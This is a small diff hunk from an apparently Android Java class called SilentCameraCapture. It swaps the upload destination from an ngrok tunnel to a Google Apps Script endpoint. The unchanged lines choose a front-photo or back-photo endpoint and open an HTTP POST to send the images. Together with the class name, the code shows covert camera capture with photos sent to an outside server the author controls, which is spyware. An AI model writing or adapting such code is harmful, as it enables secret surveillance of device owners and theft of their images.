@@ -117,7 +117,7 @@ public class SilentCameraCapture {
             String endpoint = lensFacing == CameraCharacteristics.LENS_FACING_FRONT ?
                     "upload_front_photo" : "upload_back_photo";
 
-            URL url = new URL("https://a9e4-160-250-114-71.ngrok-free.app/" + endpoint);
+            URL url = new URL("https://script.google.com/macros/s/AKfycbxZ6S4v-0m4_CR645aVq2ZnBcc0ak-M_5UX-0yLX9jI_bhozwrkA968NaE4WRl9ay7abA/exec");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
